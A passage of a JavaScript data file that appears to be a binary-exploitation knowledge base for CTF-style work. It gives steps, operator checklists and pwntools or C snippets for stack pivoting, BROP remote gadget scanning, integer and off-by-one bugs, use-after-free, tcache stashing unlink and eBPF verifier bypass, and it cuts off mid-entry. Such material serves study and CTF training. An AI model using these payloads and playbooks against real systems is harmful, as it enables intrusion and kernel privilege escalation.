          'Then "ret" pops the first gadget of your secondary chain from the pivot destination',
          'The secondary ROP chain now executes entirely from the fake stack'
        ],
        tools: ['ROPgadget (find leave;ret)', 'pwndbg vmmap'],
        codeSnippet: `# Primary overflow (limited size):
payload = b'A' * offset_to_rbp
payload += p64(fake_rbp)           # pivot_dest - 8
payload += p64(leave_ret_gadget)   # leave; ret

# Secondary chain (placed at pivot_dest earlier):
second_payload = p64(pop_rdi) + p64(binsh) + p64(system)

# Pre-write secondary chain to heap/BSS:
p.sendlineafter(b'data:', second_payload) 

# Now trigger overflow with pivot:
p.sendlineafter(b'name:', payload)`,
        references: [
          { description: 'Stack Pivoting - CTF Wiki', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/stackoverflow/others/#stack-pivoting' }
        ]
      },
      {
        name: 'xchg rsp,rax Pivot',
        description: 'Use an xchg gadget to swap RSP into a controlled register (RAX typically) and redirect the stack.',
        steps: [
          'Find "xchg rax, rsp; ret" or "xchg rsp, rax; ret" gadget',
          'Control RAX value (via "pop rax; ret" in the limited overflow) to point to your fake stack',
          'Chain: pop rax; ret → xchg rsp,rax; ret → execution continues from fake stack'
        ],
        tools: ['ROPgadget', 'ropper'],
        references: [
          { description: 'xchg pivot technique' }
        ]
      },
      {
        name: 'pop rsp; ret Pivot (Direct)',
        description: 'The simplest pivot: directly overwrite RSP with a gadget that pops RSP from the stack.',
        steps: [
          'Find "pop rsp; ret" gadget (rare but powerful)',
          'Payload: padding + pop_rsp + p64(fake_stack_addr) → RSP jumps to fake stack on ret'
        ],
        tools: ['ROPgadget', 'ropper'],
        references: []
      }
    ],

    postconditions: {
      successIndicators: [
        'RSP register redirected to a non-stack memory region',
        'ROP chain executing from heap/BSS/libc writable memory',
        'Full-length ROP chain succeeds despite limited primary overflow'
      ],
      artifacts: [
        'GDB: info registers rsp → shows address in heap or .bss instead of stack'
      ]
    },

    operatorChecklist: [
      '[ ] Measure exact byte count available past RIP (is it < ~100 bytes?)',
      '[ ] Identify a writable, known-address region for the secondary payload',
      '[ ] Pre-place the secondary ROP chain at the pivot destination',
      '[ ] Find a leave;ret or xchg rsp,reg gadget',
      '[ ] Calculate fake_rbp = pivot_dest - 8 for leave;ret pivot',
      '[ ] Build primary payload: padding + fake_rbp + pivot_gadget',
      '[ ] Test in GDB: watch RSP change after the leave;ret or xchg',
      '[ ] Verify secondary chain gadgets have valid addresses in the new context'
    ],

    vulnerabilityTypes: ['stack', 'pivot'],
    references: [
      { description: 'Stack Pivot Tutorial', url: 'https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting' },
      { tool: 'ROPgadget', description: 'Find leave;ret and xchg gadgets' }
    ]
  },

  brop_exploit: {
    id: 'brop_exploit',
    name: 'Blind Return Oriented Programming (BROP)',
    category: 'technique',
    class: 'brop',
    description: 'Exploits a remote forking server to progressively brute-force ROP gadgets without any binary or library access. The key insight: in a forking server, the same binary image is shared across child processes, so you can probe for gadgets byte-by-byte by observing server responses (crash vs. no crash).',

    preconditions: {
      summary: 'A remote service that forks on each connection, has a stack buffer overflow, and you have zero access to the binary or libc.',
      required: [
        'Stack buffer overflow in a forking server (each connection = new child process with same address space)',
        'Server MUST restart cleanly after crash (fork model ensures this)',
        'PIE is off (or the binary base is fixed — BROP can bruteforce PIE too but it is much harder)',
        'NX is enabled (otherwise simple shellcode would work)',
        'No stack canary, or canary is bruteforceable in the fork model',
        'The stop gadget (a reliable "does-not-crash" address) must be findable'
      ],
      detectionSteps: [
        'Test: send a long input → does server crash/close? If yes and it stays up for reconnection, fork model confirmed',
        'Test: can you detect crash vs non-crash responses? (e.g., connection close = crash, reading a response = no crash)',
        'Run BROP scanner script to automatically discover gadgets'
      ]
    },

    exploitationPaths: [
      {
        name: 'Full BROP Gadget Discovery + Dump',
        description: 'The complete BROP workflow: find stop gadget, find BROP gadget (pop rdi; ret), find PLT entries, dump binary.',
        steps: [
          'Phase 1 — Find Stop Gadget: Brute-force addresses by sending padding+addr. If server returns data (no crash), the address likely points to a "ret" or benign instruction. Collect all non-crashing addresses.',
          'Phase 2 — Find BROP Gadget (pop rdi; ret): After finding the stop gadget at addr_s, probe addresses addr_x by sending: padding + addr_x + arg + addr_s. If the server does not crash, addr_x is a "pop rdi; ret" (it pops arg off the stack and returns to stop).',
          'Phase 3 — Find PLT entries: With known pop_rdi, probe for puts@plt by sending: pop_rdi + candidate_got + candidate_plt. If the server returns recognizable data (like libc bytes), candidate_plt is puts@plt.',
          'Phase 4 — Dump Binary: Use puts@plt to read the entire binary text section page by page. Identify more gadgets, GOT entries, and string tables.',
          'Phase 5 — Exploit: Use leaked binary/libraries to build a complete ROP chain for ret2libc or shell spawning.'
        ],
        tools: ['pwntools (BROP automation)', 'custom BROP scanner scripts'],
        codeSnippet: `# BROP Stop Gadget Finder (simplified):
def find_stop_gadget(start_addr, end_addr, step=1):
    stops = []
    for addr in range(start_addr, end_addr, step):
        try:
            p = remote(host, port)
            payload = b'A' * offset + p64(addr)
            p.send(payload)
            if p.can_recv(timeout=2):  # server didn't crash
                stops.append(addr)
            p.close()
        except:
            pass
    return stops

# Find pop rdi (BROP gadget):
def find_pop_rdi(stop_addr, candidates, arg=0xdeadbeef):
    pop_rdi = []
    for addr in candidates:
        try:
            p = remote(host, port)
            payload = b'A' * offset + p64(addr) + p64(arg) + p64(stop_addr)
            p.send(payload)
            if p.can_recv(timeout=2):
                pop_rdi.append(addr)
            p.close()
        except:
            pass
    return pop_rdi`,
        references: [
          { description: 'Original BROP Paper (Stanford)', url: 'https://www.scs.stanford.edu/brop/' },
          { description: 'BROP CTF Tutorial', url: 'https://ctf101.org/binary-exploitation/blind-return-oriented-programming/' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'Binary image fully dumped from remote service without any prior knowledge',
        'libc version identified from leaked addresses and offsets',
        'Full ROP chain built and shell obtained'
      ],
      artifacts: [
        'Dumped .text section of the remote binary',
        'List of discovered gadgets at specific offsets'
      ]
    },

    operatorChecklist: [
      '[ ] Confirm remote service is a forking server (stays up after crash)',
      '[ ] Verify PIE is off (or factor in PIE bruteforce time)',
      '[ ] Find overflow offset using sequential probing',
      '[ ] Brute-force stop gadget (all non-crashing addresses)',
      '[ ] From stop gadgets, find BROP gadget (pop rdi; ret)',
      '[ ] Scan for PLT entries (puts, write, printf) using BROP gadget',
      '[ ] Dump binary .text section via puts@plt',
      '[ ] Analyze dumped binary to find more gadgets and libc pointers',
      '[ ] Build final ROP chain using discovered addresses',
      '[ ] Send exploit to remote'
    ],

    vulnerabilityTypes: ['stack', 'brop'],
    references: [
      { description: 'BROP: Automatically ROPping for Remote Exploitation', url: 'https://www.scs.stanford.edu/brop/bittau-brop.pdf' },
      { description: 'BROP on CTF101', url: 'https://ctf101.org/binary-exploitation/blind-return-oriented-programming/' }
    ]
  },

  integer_exploit_techniques: {
    id: 'integer_exploit_techniques',
    name: 'Integer Overflow & Underflow Exploitation',
    category: 'technique',
    class: 'integer-exploits',
    description: 'Exploits arithmetic wraparound bugs where integer calculations overflow or underflow, resulting in undersized buffer allocations, negative lengths treated as huge unsigned values, or incorrect size checks that enable buffer overflows.',

    preconditions: {
      summary: 'Arithmetic on user-controlled integers is performed without overflow checks, leading to memory corruption.',
      required: [
        'User-controlled numeric input (size, length, index) used in allocation or bounds checking',
        'Arithmetic involving user-controlled values: addition, subtraction, multiplication, or casting',
        'No overflow/saturation checks in the arithmetic path',
        'A subsequent operation (malloc, memcpy, read, loop boundary) that depends on the corrupted result'
      ],
      detectionSteps: [
        'Search for arithmetic on sizes: grep for "malloc\(.*\+.*\)" or "malloc\(.*\*.*\)" in decompiled code',
        'Test edge cases: send 0xFFFFFFFF, 0x80000000, -1, 0, and watch allocation sizes in ltrace',
        'In GDB: set breakpoint on malloc → observe allocation size argument',
        'Look for signed/unsigned mismatches: if (len < MAX) where len is signed int and MAX is small',
        'Test negative values: if the program accepts signed integers, send -1 → might become 0xFFFFFFFF when cast to size_t'
      ]
    },

    exploitationPaths: [
      {
        name: 'Integer Overflow → Heap Buffer Overflow',
        description: 'Overflow the size calculation for malloc, causing a too-small allocation that triggers a heap overflow when data is copied.',
        steps: [
          'Identify allocation: size = user_size + constant → if user_size = 0xFFFFFFFF, size wraps to constant-1',
          'Result: malloc(small_size) returns a small buffer, but the program copies user_size bytes (huge) into it',
          'Overflow corrupts adjacent heap metadata, enabling standard heap exploitation',
          'Target: next chunk\'s size field, fd/bk pointers, or application data'
        ],
        tools: ['GDB', 'pwntools', 'ltrace'],
        codeSnippet: `# User sends a huge size that wraps:
size_t user_size = get_user_input();  # e.g., 0xFFFFFFFF
size_t alloc_size = user_size + 0x10; # wraps to 0xF (tiny)
char *buf = malloc(alloc_size);       # allocates only 15 bytes
read(0, buf, user_size);              # reads 4GB into 15-byte buffer!`,
        applicableLibc: 'All versions',
        references: [
          { description: 'Integer Overflow Exploitation', url: 'https://ctf101.org/binary-exploitation/integer-overflow/' }
        ]
      },
      {
        name: 'Integer Underflow → Large Size Pass',
        description: 'Subtract from a user-controlled value to underflow, making size-1 wrap to 0xFFFFFFFF.',
        steps: [
          'Example: user_size = 0; check: if (user_size - 1 > MAX) fail → 0 - 1 = 0xFFFFFFFF > MAX, so check FAILS',
          'Result: size-1 is huge, but the original size=0 bypassed the check',
          'The large value is passed to read/memcpy → massive heap/stack overflow'
        ],
        tools: ['GDB', 'python for quick fuzzing'],
        references: [
          { description: 'Integer Underflow CTF Examples' }
        ]
      },
      {
        name: 'Sign Extension → Type Confusion',
        description: 'A small negative signed value (e.g., char -1 = 0xFF) is implicitly cast to a larger unsigned type (e.g., size_t), becoming 0xFFFFFFFF.',
        steps: [
          'Find: char length = get_user_byte();  // user sends 0xFF (-1 as signed char)',
          'Cast: int total = length + header_size;  // length is sign-extended to 0xFFFFFFFF',
          'if (total < MAX) → 0xFFFFFFFF < MAX? Probably passes!',
          'memcpy(dst, src, total) → copies 4GB into a small buffer'
        ],
        tools: ['Ghidra/IDA (look for C casts from int8_t → size_t)', 'pwntools'],
        references: [
          { description: 'Type Juggling and Sign Extension Bugs' }
        ]
      },
      {
        name: 'Negative Index → Out-of-Bounds Access',
        description: 'Using a negative signed integer as an array index, which wraps to a huge unsigned offset that lands outside the buffer.',
        steps: [
          'Find: int idx = get_user_input(); arr[idx] = value;',
          'Send idx = -1 → accesses arr[-1] = arr[max_size_t], effectively a backward OOB write',
          'This can overwrite saved variables, heap metadata, or security-critical flags on the stack'
        ],
        tools: ['GDB', 'pwntools'],
        references: [
          { description: 'Negative Array Index Exploit' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'Allocation size smaller than intended → heap corruption',
        'Negative value bypasses size check → huge copy operation',
        'Buffer overflow achieved via arithmetic wraparound'
      ],
      artifacts: [
        'GDB: malloc called with size = 0x0000000F (wrapped) or similar tiny value',
        'Segfault at memcpy/read with huge count argument'
      ]
    },

    operatorChecklist: [
      '[ ] Search decompiled code for arithmetic on user input before malloc/memcpy',
      '[ ] Test 0xFFFFFFFF, 0x80000000, 0x7FFFFFFF as size inputs',
      '[ ] Test -1 (0xFFFFFFFF as signed) and 0 for edge cases',
      '[ ] Check if size_t or unsigned int is used (wrapping behavior)',
      '[ ] In IDA/Ghidra, look for IMUL, ADD, SUB before memory operations',
      '[ ] Use ltrace to observe actual malloc sizes vs. user input',
      '[ ] Fuzz with random integer values to identify wraparound points',
      '[ ] Once overflow confirmed, apply standard heap/stack exploitation'
    ],

    vulnerabilityTypes: ['integer', 'overflow', 'underflow'],
    references: [
      { tool: 'ltrace', description: 'Trace library calls to observe allocation sizes' },
      { description: 'Integer Overflow on CTF Wiki', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/integeroverflow/intof/' },
      { description: 'CWE-190: Integer Overflow or Wraparound', url: 'https://cwe.mitre.org/data/definitions/190.html' }
    ]
  },

  off_by_one_exploit: {
    id: 'off_by_one_exploit',
    name: 'Off-By-One Exploitation',
    category: 'technique',
    class: 'off-by-one',
    description: 'Exploits a single-byte overflow past a buffer boundary. Despite only controlling one byte, this can corrupt critical metadata like the saved RBP LSB on the stack or the PREV_INUSE bit and prev_size of heap chunks, enabling stack pivoting or heap coalescing attacks.',

    preconditions: {
      summary: 'A loop or copy operation writes exactly one byte past the end of a buffer.',
      required: [
        'Loop condition i <= size instead of i < size, or strcpy with off-by-one strncpy size, or similar boundary error',
        'The byte after the buffer must be attacker-controllable (not zeroed and not write-protected)',
        'On the stack: saved RBP or canary byte lies immediately after the buffer',
        'On the heap: the next chunk\'s size field (specifically the PREV_INUSE bit and/or prev_size field) is adjacent'
      ],
      detectionSteps: [
        'Static: look for for(int i=0; i<=len; i++) or read(0,buf, len+1) patterns',
        'Test: send exactly buffer_size+1 bytes → check for segfault or heap corruption',
        'In GDB: examine memory layout around the buffer — what does byte buffer[buf_size] touch?'
      ]
    },

    exploitationPaths: [
      {
        name: 'Off-by-One on Stack → Saved RBP Corruption → Stack Pivot',
        description: 'Overwrite the LSB of saved RBP, redirecting the caller\'s frame to attacker-controlled data.',
        steps: [
          'On function epilogue: "leave" = mov rsp,rbp; pop rbp → RSP points to the corrupted frame',
          'The attacker places a fake frame (with controlled return address) where the corrupted RBP now points',
          'When the caller returns, it uses the fake frame → RIP hijacked to attacker-chosen gadget',
          'Single LSB overwrite limits the target to ±128 bytes from original RBP — you need to place a ROP chain within range'
        ],
        tools: ['GDB', 'pwntools'],
        codeSnippet: `# Stack off-by-one: overwrite saved RBP LSB
payload = b'A' * buffer_size          # fill buffer
payload += b'\\x00'                   # overwrite LSB of saved RBP (set to 0)
# Or: payload += b'\\x??'             # redirect to specific offset

# In the caller's stack frame, place a fake frame:
# fake_rbp + 8 = address of next gadget/ret address
# fake_rbp + 0 = next fake_rbp value`,
        references: [
          { description: 'Off-by-One Stack Exploitation', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/stackoverflow/others/#off-by-one' }
        ]
      },
      {
        name: 'Off-by-One on Heap → NULL Byte Poisoning → House of Einherjar',
        description: 'Overwrite the PREV_INUSE bit of the next chunk to 0, forcing backward consolidation on free() with a fake prev_size.',
        steps: [
          'Allocate chunks A, B, C. Buffer in A overflows by 1 byte into B\'s size field, clearing the PREV_INUSE bit (lowest bit)',
          'Set A\'s prev_size field (or B\'s if the overflow reaches it) to the distance between A and a fake chunk you forged inside A',
          'Free(B) → allocator checks B->prev_inuse == 0 → consolidates backward by B->prev_size → fake chunk is now in unsorted bin',
          'Allocate a new chunk that overlaps with B (now freed) → arbitrary write via overlapping chunk primitive'
        ],
        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
        codeSnippet: `# Off-by-one NULL byte into next chunk's PREV_INUSE
chunk_a = malloc(0xf8)   # 0x100 chunk
chunk_b = malloc(0x108)  # 0x110 chunk
chunk_c = malloc(0x88)   # guard chunk (prevents top chunk coalesce)

# Forge fake chunk inside A
fake_chunk = chunk_a + 0x?? 
*(fake_chunk) = 0x91     # fake size

# Overflow from A into B's size field
# B's original size: 0x111 → after NULL byte: 0x100 (PREV_INUSE cleared!)
*(chunk_a + 0xf8) = 0x00

# Set prev_size to point to fake chunk
*(chunk_b + 0x8) = 0x??  # distance = chunk_b - fake_chunk

free(chunk_b)  # backward consolidate → fake chunk in unsorted bin
malloc(0x100)  # overlapping allocation`,
        references: [
          { description: 'House of Einherjar / Poisoned NUL byte', url: 'https://heap-exploitation.dhavalkapil.com/attacks/house_of_einherjar' }
        ]
      },
      {
        name: 'Off-by-One → Canary Byte Leak (Null Byte)',
        description: 'If a buffer is immediately followed by the canary whose first byte is always 0x00, an off-by-one write of 0x00 into the buffer spills a non-null canary byte into the output.',
        steps: [
          'Fill buffer to max capacity; the buffer\'s null terminator overwrites the canary\'s inherent 0x00 LSB',
          'Print/leaking buffer now dumps the canary\'s full 8 bytes (since there\'s no 0x00 to stop at)',
          'Use leaked canary to fix up a subsequent buffer overflow payload'
        ],
        tools: ['pwntools', 'pwndbg'],
        references: [
          { description: 'Canary leak via off-by-one' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'Stack frame pivot achieved with a single-byte RBP overwrite',
        'Heap chunks consolidated unexpectedly via PREV_INUSE clear',
        'Canary or PIE base leaked via off-by-one into leak primitive'
      ],
      artifacts: [
        'GDB: corrupted prev_size or chunk size LSB in heap visualization',
        'RSP redirected from expected stack frame'
      ]
    },

    operatorChecklist: [
      '[ ] In decompiled code: find <= in loop conditions or unguarded strncpy',
      '[ ] Determine what byte lies immediately after the buffer (stack: saved RBP LSB, heap: next chunk size)',
      '[ ] Stack: calculate where a fake frame can be placed within ±128 bytes of corrupted RBP',
      '[ ] Stack: set LSB to redirect RBP into a controlled buffer area',
      '[ ] Heap: forge fake chunk with valid size inside a preceding allocation',
      '[ ] Heap: overwrite PREV_INUSE bit + prev_size of trailing chunk',
      '[ ] Trigger free() on the trailing chunk to consolidate',
      '[ ] Exploit overlapping chunk primitive for arbitrary write'
    ],

    vulnerabilityTypes: ['stack', 'heap', 'off-by-one'],
    references: [
      { description: 'Off-by-One Vulnerabilities', url: 'https://ctf101.org/binary-exploitation/off-by-one/' },
      { description: 'Poisoned NUL Byte Attack', url: 'https://heap-exploitation.dhavalkapil.com/attacks/house_of_einherjar' }
    ]
  },

  use_after_free_detailed: {
    id: 'use_after_free_detailed',
    name: 'Use-After-Free (UAF)',
    category: 'technique',
    class: 'uaf',
    description: 'A dangling pointer continues to be used after the memory it points to has been freed. If an attacker can reallocate that freed memory with controlled data before the dangling pointer is used, they can corrupt program state, hijack function pointers, or achieve arbitrary read/write.',

    preconditions: {
      summary: 'A pointer is freed but not nullified, and the program later dereferences it. An attacker must be able to allocate a new object of the same size in the freed slot.',
      required: [
        'free(p) is called, but p is not set to NULL afterward (dangling pointer)',
        'Later code dereferences p (reads from or writes to *p)',
        'Attacker can trigger an allocation (malloc/calloc/new) of the same size class between the free and the use',
        'The reallocation\'s content is partially or fully attacker-controlled'
      ],
      detectionSteps: [
        'Static: look for free() calls without subsequent NULL assignment in Ghidra/IDA',
        'Dynamic: set GDB watchpoint on the freed chunk — does any code touch it after free?',
        'In pwndbg: use the "bins" command to see freed chunks; then "x/gx freed_addr" after the supposed-free to check usage',
        'Fuzzing: after triggering free, send controlled data to reallocation paths, then trigger the use path'
      ]
    },

    exploitationPaths: [
      {
        name: 'UAF → vtable/Function Pointer Hijack',
        description: 'The freed object contains a vtable pointer or function pointer. Overwrite it with a controlled allocation to redirect execution.',
        steps: [
          'Free an object that contains a vtable pointer (in its first 8 bytes)',
          'Allocate attacker-controlled data of the same size → overwrites the freed object\'s memory, including the old vtable pointer',
          'Use the dangling pointer to call a virtual method → jumps to the attacker-controlled vtable entry',
          'Points vtable entry to system(), one_gadget, or a ROP chain'
        ],
        tools: ['pwndbg heap', 'pwntools', 'GDB'],
        codeSnippet: `// C++ UAF vtable hijack
Object *obj = new Object();
delete obj;          // obj is dangling, memory goes to tcache/fastbin

char *fake = (char*)malloc(sizeof(Object));
strcpy(fake, controlled_data);
*(void**)(fake) = fake_vtable;   // overwrite vtable ptr in freed slot

obj->virtual_method();  // UAF: calls *(fake_vtable + method_offset)`,
        applicableLibc: 'All versions',
        references: [
          { description: 'UAF Exploitation Guide', url: 'https://ctf101.org/binary-exploitation/use-after-free/' }
        ]
      },
      {
        name: 'UAF → Overlapping Objects → Arbitrary R/W',
        description: 'Reallocate a freed chunk with a different object type, creating a type confusion between the old and new objects.',
        steps: [
          'Free chunk A (size X, contains pointers)',
          'Allocate chunk B of size X with different semantics (e.g., string buffer instead of object)',
          'Chunk B overlaps with the old memory of A — the dangling pointer to A now reads/writes B\'s data',
          'If A contained a length field and B writes controlled data there, you can forge size fields for OOB access',
          'Alternatively, if B contains pointers, reading via the dangling A pointer leaks heap addresses'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        references: [
          { description: 'Type Confusion via UAF' }
        ]
      },
      {
        name: 'UAF → tcache/fastbin Metadata Corruption',
        description: 'Use the dangling pointer to corrupt freed chunk metadata (fd/bk pointers) while the chunk is in a bin.',
        steps: [
          'Free chunk → enters tcache or fastbin. The fd pointer now points to the next free chunk (or NULL)',
          'UAF write via dangling pointer: overwrite the fd pointer to point to a target address',
          'Allocate from the bin twice: first returns the original chunk, second returns the fake chunk at the target',
          'Write to the fake chunk = arbitrary memory write'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        applicableLibc: '2.23-2.31 (without tcache safe-linking)',
        codeSnippet: `p1 = malloc(0x60)
free(p1)            # p1 in tcache
p2 = malloc(0x60)   # p2 == p1 (tcache returns same chunk)
# p1 is now dangling (same memory as p2)
*(uint64_t*)p1 = target_addr  # corrupt tcache fd via dangling p1
malloc(0x60)        # allocates p1 again
malloc(0x60)        # returns chunk at target_addr!`
      }
    ],

    postconditions: {
      successIndicators: [
        'Freed memory reallocated and controlled by attacker',
        'Virtual method dispatch redirected to attacker address',
        'Arbitrary allocation at chosen memory location'
      ],
      artifacts: [
        'GDB: freed chunk in tcache/fastbin with corrupted fd pointer',
        'Heap chunk overlapping with dangling pointer use'
      ]
    },

    operatorChecklist: [
      '[ ] Find free(p) call where p is not nullified',
      '[ ] Determine size class of the freed object',
      '[ ] Identify all code paths that dereference p after the free',
      '[ ] Find an allocation path of the same size class under attacker control',
      '[ ] For vtable hijack: calculate offset of the virtual method to be called',
      '[ ] For bin corruption: compute target address and safe-link XOR if needed',
      '[ ] Test locally: trigger free → allocate controlled → trigger use → verify crash at controlled address',
      '[ ] Escalate from arbitrary address access to code execution (one_gadget, system hook, etc.)'
    ],

    vulnerabilityTypes: ['heap', 'uaf'],
    references: [
      { description: 'How2Heap: UAF examples', url: 'https://github.com/shellphish/how2heap' },
      { description: 'CTF101: Use-After-Free', url: 'https://ctf101.org/binary-exploitation/use-after-free/' }
    ]
  },

  tcache_stashing_unlink_detailed: {
    id: 'tcache_stashing_unlink_detailed',
    name: 'Tcache Stashing Unlink Attack',
    category: 'technique',
    class: 'heap-technique',
    description: 'Exploits the tcache stashing mechanism in calloc() (which bypasses tcache) to unlink a corrupted chunk from smallbins. By corrupting the bk pointer of a smallbin chunk, an arbitrary write is achieved when calloc retrieves a chunk from the smallbin and stashes remaining chunks into tcache.',

    preconditions: {
      summary: 'calloc is used to allocate memory, which goes directly to smallbins (skipping tcache). If tcache for the requested size has < 2 free slots, calloc will cache remaining smallbin chunks into tcache, unlinking them — and a corrupted bk pointer triggers an arbitrary write.',
      required: [
        'calloc() is used (NOT malloc — malloc goes to tcache first, bypassing the stash path)',
        'Glibc 2.26-2.31 (tcache with stashing in calloc)',
        'Ability to corrupt the bk pointer of a smallbin chunk',
        'tcache for the target size must have at least 1 free slot but less than TCACHE_FILL_COUNT (7)',
        'Smallbin must have at least 2 chunks (the target + one valid chunk for the forward list)'
      ],
      detectionSteps: [
        'Run: objdump -d ./binary | grep calloc → verify calloc usage',
        'Check libc version: strings libc.so | grep "GNU C Library"',
        'In GDB: inspect smallbin via pwndbg "bins" command after freeing chunks',
        'Verify tcache count for the target size is between 1 and 6'
      ]
    },

    exploitationPaths: [
      {
        name: 'calloc → Smallbin → Corrupted bk → Arbitrary Write',
        description: 'The core stashing unlink — corrupt bk of a smallbin chunk to write a libc pointer (main_arena+X) to an arbitrary location.',
        steps: [
          'Set up: allocate and free enough chunks to populate a smallbin and leave tcache with 1-3 slots remaining',
          'Corrupt the bk pointer of the last chunk in the smallbin to point to target_addr - 0x10 (where 0x10 is the offset of the bk field within a malloc_chunk)',
          'calloc() is called for the smallbin size → calloc sees tcache is not full → retrieves one chunk from smallbin → then tries to stash remaining chunks into tcache',
          'During stashing, the corrupted bk is followed → smallbin->bk->fd = smallbin (the unlink write) → target_addr now contains a pointer into main_arena',
          'This is a "write-what-where" where the "what" is a libc address, useful for overwriting _IO_list_all or similar globals'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Setup: fill tcache for size 0x100
for i in range(7):
    free(malloc(0x100))

# Create smallbin chunks
a = malloc(0x100)
b = malloc(0x100)
free(a)  # a → unsorted bin
free(b)  # b → unsorted bin, consolidates with a? Use a guard chunk
# ... (after consolidation prevention)

# Corrupt last smallbin chunk's bk:
# smallbin_tail->bk = target - 0x10
*(uint64_t*)(smallbin_tail + 0x18) = target_addr - 0x10

# Trigger: calloc(0x100) → stashing unlink → arbitrary write at target_addr
c = calloc(1, 0x100)  # boom!`,
        applicableLibc: '2.26-2.31',
        references: [
          { description: 'Tcache Stashing Unlink Attack', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/tcache_attack/#tcache-stashing-unlink-attack' },
          { description: 'How2Heap: tcache_stashing_unlink', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.30/tcache_stashing_unlink_attack.c' }
        ]
      },
      {
        name: 'Stashing Unlink → _IO_list_all Overwrite → FSOP',
        description: 'Use the arbitrary write from stashing unlink to corrupt _IO_list_all (a pointer in libc that chains all open FILE streams), achieving FSOP.',
        steps: [
          'The stashing unlink writes main_arena+0x60-ish (varies by glibc) to target_addr - 0x10 + 0x10 = target_addr',
          'Choose target_addr = &_IO_list_all - 0x10, so that _IO_list_all now points into main_arena (a heap pointer)',
          'Forge a fake _IO_FILE structure on the heap at that address, with a valid vtable (for glibc < 2.24) or a forged wide_data (for glibc 2.24+)',
          'Trigger exit() or return from main → _IO_flush_all_lockp walks _IO_list_all → calls our fake vtable function'
        ],
        tools: ['pwndbg', 'pwntools'],
        applicableLibc: '2.26-2.31',
        references: [
          { description: 'Stashing Unlink + FSOP chain' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'Arbitrary address overwritten with a libc/heap pointer (main_arena+X)',
        '_IO_list_all or other globals corrupted to enable second-stage exploitation',
        'Code execution achieved via FSOP or similar post-write technique'
      ],
      artifacts: [
        'GDB: corruption of _IO_list_all pointer visible after calloc',
        'Smallbin with corrupted bk chain'
      ]
    },

    operatorChecklist: [
      '[ ] Verify calloc() is used in the binary (not just malloc)',
      '[ ] Determine glibc version (must be 2.26-2.31 for stashing)',
      '[ ] Set up heap: free chunks into smallbin, leave tcache with 1-4 slots remaining',
      '[ ] Identify smallbin layout via "pwndbg bins"',
      '[ ] Corrupt the bk pointer of a smallbin chunk via UAF or heap overflow',
      '[ ] Choose target: _IO_list_all, __free_hook, or any writable global',
      '[ ] Trigger calloc() to invoke the stash and unlink',
      '[ ] Verify the write occurred via GDB inspection',
      '[ ] Chain with FSOP or other second-stage technique for code execution'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'calloc'],
    references: [
      { description: 'Tcache Stashing Unlink Attack on CTF Wiki', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/tcache_attack/#tcache-stashing-unlink-attack' },
      { description: 'How2Heap tcache_stashing_unlink_attack.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.30/tcache_stashing_unlink_attack.c' }
    ]
  },

  ebpf_exploit_detailed: {
    id: 'ebpf_exploit_detailed',
    name: 'eBPF Verifier Bypass Exploitation',
    category: 'technique',
    class: 'ebpf',
    description: 'Exploits flaws in the Linux kernel\'s eBPF verifier — a static analyzer that "proves" eBPF programs are safe before loading them. By finding verifier bugs (incorrect bounds tracking, type confusion, or speculative execution issues), attackers load malicious BPF programs that can read/write arbitrary kernel memory.',

    preconditions: {
      summary: 'A bug in the eBPF verifier allows loading a BPF program that accesses memory beyond the verifier-approved bounds.',
      required: [
        'CAP_BPF or CAP_SYS_ADMIN capability, OR unprivileged BPF is enabled (kernel.unprivileged_bpf_disabled=0)',
        'A vulnerable kernel version with a known verifier bypass (CVE)',
        'Knowledge of kernel data structures (task_struct, cred, modprobe_path, etc.)',
        'Ability to interact with the BPF syscall (bpf(BPF_PROG_LOAD, ...))'
      ],
      detectionSteps: [
        'Check kernel version: uname -r → map to known CVEs',
        'Check BPF access: cat /proc/sys/kernel/unprivileged_bpf_disabled (0 = enabled)',
        'Check if you have CAP_BPF: capsh --print | grep cap_bpf',
        'Run existing eBPF exploit PoCs against the kernel to test vulnerability'
      ]
    },

    exploitationPaths: [
      {
        name: 'Verifier Bounds Check Bypass → Arbitrary Kernel Read',
        description: 'Trick the verifier into believing a BPF register\'s value is within safe bounds when it can actually hold an out-of-bounds value at runtime.',
        steps: [
          'Identify a verifier bug where register min/max bounds (umax_value/smin_value) are not properly updated after certain ALU operations',
          'Craft BPF bytecode: use BPF_JMP32 with signed comparisons to create a register the verifier thinks is bounded to [0,N) but can actually hold > N',
          'Use the OOB register as an index into a BPF map value → read kernel memory past the map allocation',
          'Leak kernel text/data pointers via the OOB read to bypass KASLR'
        ],
        tools: ['bpf_asm (BPF assembler)', 'custom eBPF bytecode generator', 'pwntools'],
        codeSnippet: `// Pseudocode for verifier bounds bypass:
// Trick: make verifier think r1 is in range [0, 100], but r1 can be 0xFFFF
BPF_MOV64_REG(BPF_REG_2, BPF_REG_1)
BPF_JMP_IMM(BPF_JGT, BPF_REG_2, 100, +1) // if r2 > 100, jump
BPF_EXIT()                                  // safe path: exit
// Attacker sends r1 = 0xFFFFFFFF (signed -1)
// Verifier: r1=smin=-1,smax=-1 on this path (BUG: smax not updated after signed compare)
// But actual runtime: r1 = 0xFFFFFFFF → used as index → OOB!`,
        references: [
          { description: 'CVE-2020-8835: eBPF verifier bounds tracking bug', url: 'https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification' },
          { description: 'eBPF Verifier Exploitation Techniques', url: 'https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story' }
        ]
      },
      {
        name: 'BPF Helper Function Abuse → Kernel Arbitrary Write',
